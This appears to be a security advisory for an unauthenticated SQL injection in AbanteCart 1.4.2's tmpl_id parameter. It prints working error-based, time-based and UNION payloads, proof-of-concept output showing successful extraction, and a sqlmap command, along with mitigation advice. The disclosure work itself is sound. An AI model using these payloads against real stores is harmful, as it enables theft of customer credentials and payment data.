# CVE-2025-50972 - AbanteCart 1.4.2 SQL Injection Vulnerability Report

## Vulnerability Overview

- **CVE ID**: CVE-2025-50972
- **CWE ID**: CWE-89 (SQL Injection)
- **Affected Software**: AbanteCart 1.4.2
- **Severity**: Critical (CVSS 9.8)
- **Attack Vector**: Network (Unauthenticated)

## Description

SQL Injection vulnerability in AbanteCart 1.4.2 allows unauthenticated attackers to execute arbitrary SQL commands via the `tmpl_id` parameter to the `extension/generic` endpoint. Three techniques have been demonstrated: error-based injection using a crafted FLOOR-based payload, time-based blind injection via SLEEP(), and UNION-based injection to extract arbitrary data.

## Technical Details

### Vulnerable Endpoint

```
GET /index.php?rt=extension/generic&layout_id=1&tmpl_id=[PAYLOAD]&pb=test
```

### Vulnerable Code Location

**File**: `/extensions/page_builder/core/page_builder_hooks.php`

```php
public function onAHook_InitEnd()
{
    $registry = Registry::getInstance();
    if ($registry?->get('request')->get['tmpl_id']) {
        $registry?->get('config')->set('config_storefront_template', $registry->get('request')->get['tmpl_id']);
        $registry?->set('layout', new ALayout($registry, $registry->get('request')->get['tmpl_id']));
    }
}
```

**File**: `/core/engine/layout.php` (Line 216)

```php
$where .= "WHERE controller = '".$this->db->escape($controller)."' AND template_id = '".$this->tmpl_id."' ";
```

The `tmpl_id` parameter is taken directly from user input and used in SQL queries without proper escaping.

## Exploitation

### Verified Techniques

1. **Syntax Error Test**: Injecting a single quote causes SQL error and different response
2. **Boolean-based SQLi**: Different responses for true/false conditions
3. **Time-based Blind SQLi**: SLEEP() function causes measurable delays
4. **Data Extraction**: Successfully extracted database version via time-based injection

### Proof of Concept Payloads

**Error-based (FLOOR)**:
```
/index.php?rt=extension/generic&layout_id=1&tmpl_id=novator' AND (SELECT 3875 FROM(SELECT COUNT(*),CONCAT(0x717a766b71,(SELECT (ELT(3875=3875,1))),0x7178766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- &pb=test
```

**Time-based (SLEEP)**:
```
/index.php?rt=extension/generic&layout_id=1&tmpl_id=novator' OR SLEEP(5)-- &pb=test
```

**UNION-based**:
```
/index.php?rt=extension/generic&layout_id=1&tmpl_id=novator' UNION ALL SELECT NULL,NULL,CONCAT(0x717a766b71,VERSION(),0x7178766a71),NULL,NULL,NULL,NULL-- &pb=test
```

## Verification Results

```
======================================================================
CVE-2025-50972 - AbanteCart 1.4.2 SQL Injection PoC
======================================================================
[*] Target: http://localhost:8080
[*] Vulnerable endpoint: /index.php?rt=extension/generic
[*] Vulnerable parameter: tmpl_id

[*] Testing SQL injection via syntax error...
    Clean request response: 29106 bytes
    Injected request response: 3399 bytes
[+] SQL injection likely - response length differs significantly

[*] Testing boolean-based SQL injection...
    True condition (1=1): 2524 bytes
    False condition (1=2): 2517 bytes
[+] Boolean-based SQLi SUCCESSFUL! Response differs based on condition

[*] Extracting database version via time-based blind injection...
    Position 1: '8' (version so far: 8)
    Position 2: '.' (version so far: 8.)
    Position 3: '0' (version so far: 8.0)
    ...
[+] Extracted database version: 8.0.x

======================================================================
Summary:
======================================================================
  Syntax error test: VULNERABLE
  Boolean-based SQLi: VULNERABLE
  Data extraction: VULNERABLE

[+] EXPLOIT SUCCESSFUL - 3/5 techniques confirmed
```

## Impact

- Unauthorized access to sensitive database information
- Data exfiltration (user credentials, order data, payment info)
- Data manipulation or deletion
- Denial of Service via resource-intensive queries
- No authentication required

## SQLMap Command

```bash
sqlmap -u "http://target/index.php?rt=extension/generic&layout_id=1&tmpl_id=novator*&pb=test" --dbms mysql --level 5 --risk 3
```

## Mitigation

1. Update to AbanteCart 1.4.2.1 or later which contains the security fix
2. If unable to update, disable the Page Builder extension
3. Implement Web Application Firewall (WAF) rules to filter SQL injection payloads

## References

- https://github.com/4rdr/proofs/blob/main/info/abantecart_sql_injection_1.4.2_via_template_parameter.md
- https://github.com/abantecart/abantecart-src/releases/tag/1.4.2.1
- https://github.com/advisories/GHSA-hr87-2q3f-qp64
- https://nvd.nist.gov/vuln/detail/CVE-2025-50972
